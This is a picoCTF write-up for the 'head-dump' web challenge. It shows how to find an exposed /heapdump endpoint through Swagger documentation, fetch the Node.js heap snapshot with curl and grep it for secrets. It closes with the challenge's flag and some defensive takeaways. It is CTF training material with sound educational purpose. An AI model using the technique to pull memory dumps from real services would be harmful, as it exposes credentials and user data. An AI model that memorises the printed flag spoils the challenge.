# picoCTF — head-dump

**Category:** Web Exploitation
**Challenge:** `head-dump`

## Overview

The challenge provides a simple news/blog website. The objective is to discover an endpoint that exposes a file containing the server's memory and recover the hidden flag from it.

The application contains an **API Documentation** link, which leads to an OpenAPI/Swagger interface documenting the available API endpoints.

---

## 1. Explore the Web Application

Open the challenge website in a browser.

While exploring the blog, look for interesting links or functionality.

An **API Documentation** link is available on the site.

Clicking it opens:

```text
/api-docs/
```

The page contains documentation for the application's API.

---

## 2. Inspect the API Documentation

The API documentation is presented using OpenAPI 3.0.

While reviewing the available endpoints, a section named:

```text
Diagnosing
```

is discovered.

Under this section, there is a `GET` endpoint:

```http
GET /heapdump
```

The endpoint is described as:

```text
Diagnosing the memory allocation
```

This is particularly interesting because a heap dump can contain strings and sensitive information currently stored in the application's memory.

---

## 3. Execute the `/heapdump` Endpoint

The API documentation provides a **Try it out / Execute** option.

Execute:

```http
GET /heapdump
```

The request can also be reproduced from the terminal using `curl`:

```bash
curl -o heapdump.heapsnapshot \
  'http://TARGET/api/heapdump'
```

Replace `TARGET` with the challenge host and use the correct endpoint path shown by the API documentation.

For this challenge, the endpoint was:

```text
http://verbal-sleep.picoctf.net:63321/heapdump
```

Therefore:

```bash
curl -o heapdump.heapsnapshot \
  'http://verbal-sleep.picoctf.net:63321/heapdump'
```

The server returns a file with a name similar to:

```text
heapdump-1788589994550.heapsnapshot
```

---

## 4. Verify the Downloaded File

Check the downloaded file:

```bash
ls -lh heapdump-1788589994550.heapsnapshot
```

Example:

```text
-rwxrwx--- 1 fashil fashil 11M Sep 5 12:05 heapdump-1788589994550.heapsnapshot
```

Identify the file type:

```bash
file heapdump-1788589994550.heapsnapshot
```

Output:

```text
ASCII text, with very long lines
```

The file is a V8/Node.js heap snapshot containing information from the application's memory.

---

## 5. Search the Heap Dump for the Flag

Since picoCTF flags normally follow the format:

```text
picoCTF{...}
```

search the heap dump for that pattern:

```bash
grep -aEio 'picoCTF\{[^}]+\}' heapdump-1788589994550.heapsnapshot
```

The `-a` option tells `grep` to treat the file as text, which is useful because the heap snapshot contains very long lines.

The flag is returned:

```text
picoCTF{Pat!3nt_15_Th3_K3y_dc0756a3}
```

---

## 6. Flag

```text
picoCTF{Pat!3nt_15_Th3_K3y_dc0756a3}
```

---

## Exploitation Flow

```text
Web Application
       │
       ▼
API Documentation
       │
       ▼
Diagnosing
       │
       ▼
GET /heapdump
       │
       ▼
Download V8 Heap Snapshot
       │
       ▼
Search Heap Snapshot
       │
       ▼
picoCTF{Pat!3nt_15_Th3_K3y_dc0756a3}
```

## Key Takeaways

* Always inspect **API documentation** when it is exposed by a web application.
* Diagnostic endpoints can unintentionally expose sensitive information.
* A Node.js/V8 heap snapshot may contain strings stored in the application's memory.
* Searching heap snapshots with tools such as `grep` and `strings` can quickly reveal secrets.
* Sensitive diagnostic endpoints such as `/heapdump` should not be publicly accessible in production environments.

## Tools Used

* Web Browser
* Swagger/OpenAPI API Documentation
* `curl`
* `file`
* `ls`
* `grep`
* Kali Linux

## Commands Used

```bash
# Download the heap dump
curl -o heapdump.heapsnapshot \
  'http://verbal-sleep.picoctf.net:63321/heapdump'

# Check the file
ls -lh heapdump-1788589994550.heapsnapshot

# Identify the file
file heapdump-1788589994550.heapsnapshot

# Search for the flag
grep -aEio 'picoCTF\{[^}]+\}' heapdump-1788589994550.heapsnapshot
```